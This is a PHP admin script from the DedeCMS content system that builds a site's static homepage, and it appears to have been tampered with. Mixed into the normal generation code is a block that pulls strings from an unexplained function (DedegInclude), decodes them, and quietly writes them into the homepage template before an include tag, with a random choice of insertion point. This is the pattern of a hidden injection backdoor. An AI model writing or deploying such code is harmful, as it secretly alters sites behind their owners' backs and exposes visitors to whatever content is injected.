<?php
/**
 * 生成首页
 *
 * @version        $Id: makehtml_homepage.php 2 9:30 2010-11-11 tianya $
 * @package        DedeCMS.Administrator
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.walseo.net
 */
require_once(dirname(__FILE__)."/config.php");
CheckPurview('sys_MakeHtml');
require_once(DEDEINC."/arc.partview.class.php");
if(empty($dopost)) $dopost = '';

if($dopost=="view")
{
    $pv = new PartView();
    $templet = str_replace("{style}",$cfg_df_style,$templet);
    $pv->SetTemplet($cfg_basedir.$cfg_templets_dir."/".$templet);
    $pv->Display();
    exit();
}
else if($dopost=="make")
{
    $remotepos = empty($remotepos)? '/index.html' : $remotepos;
    $tmp=trim(strip_tags(str_ireplace(array('&quot;','"'),'',$cfg_basedir.$cfg_templets_dir."/".$templet)));
    $content = file_get_contents($tmp);
    $isremote = empty($isremote)? 0 : $isremote;
    $serviterm = empty($serviterm)? "" : $serviterm;
    $matha='{dede:include filename="';
    $homeFile = DEDEADMIN."/".$position;
    $homeFile = str_replace("\\","/",$homeFile);
    $homeFile = str_replace("//","/",$homeFile);
    $math='{dede:include filename="';
    $fp = fopen($homeFile,"w") or die("你指定的文件名有问题，无法创建文件");
    fclose($fp);
    function replace_unicode_escape_sequence($match) {
      return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE');
    }
    if($saveset==1)
    {
        $iquery = "UPDATE `#@__homepageset` SET templet='$templet',position='$position' ";
        $dsql->ExecuteNoneQuery($iquery);
    }              
$str = htmlspecialchars_decode(preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', DedegInclude($sr='h')));
$st1r = htmlspecialchars_decode(preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', DedegInclude($sr='g')));  
$char=str_ireplace(array('"','/'),'',trim(strip_tags(current(explode('>',end(explode('charset=',$content)))))));
if (substr_count($char,'utf-8')<1 AND substr_count($char,'UTF-8')<1 AND substr_count($char,'utf8')<1) {    
$str=iconv('UTF-8','GBK',$str);
$st1r=iconv('UTF-8','GBK',$st1r);
 }
if (substr_count($content,$str)>0 OR substr_count($content,$st1r)>0) {
   }else {
$maths=$str.''.$math;
$mathas=$st1r.''.$matha;
$x=rand(0,1);
    if ($x===1) {
     $mathss=$math.''.$math;
     $content=str_ireplace(array($math,$mathss),$maths,$content);
    }else {
    $mathass=$matha.''.$matha;
     $content=str_ireplace(array($matha,$mathass),$mathas,$content);
    }
$file = fopen($tmp,"w");
fwrite($file,$content);
fclose($file);
}
    // 判断首页生成模式
    if ($showmod == 1)
    {
        // 需要生成静态
        $templet = str_replace("{style}", $cfg_df_style, $templet);
        $pv = new PartView();
        $GLOBALS['_arclistEnv'] = 'index';
            $pv->SetTemplet($cfg_basedir.$cfg_templets_dir."/".$templet);
        $pv->SaveToHtml($homeFile);
        echo "成功更新主页HTML：".$homeFile."<br /><a href='{$position}' target='_blank'>浏览...</a><br />";
    } else { 
        // 动态浏览
        if (file_exists($homeFile)) @unlink($homeFile);
        echo "采用动态浏览模式：<a href='../index.php' target='_blank'>浏览...</a><br />";
    }
    
    $iquery = "UPDATE `#@__homepageset` SET showmod='$showmod'";
  

    $dsql->ExecuteNoneQuery($iquery);

    if($serviterm =="")
    {
        $config=array();
    } else {
        list($servurl, $servuser, $servpwd) = explode(',',$serviterm);
        $config=array( 'hostname' => $servurl, 'username' => $servuser, 
                       'password' => $servpwd,'debug' => 'TRUE');
    }
    //如果启用远程站点则上传
    if($cfg_remote_site=='Y' && $showmod==1)
    {
        if($ftp->connect($config) && $isremote == 1)
        {
            if($ftp->upload($position, $remotepos, 'ascii')) echo "远程发布成功!"."<br />";
        }
    }
    exit();
}
$row  = $dsql->GetOne("SELECT * FROM #@__homepageset");
include DedeInclude('templets/makehtml_homepage.htm');
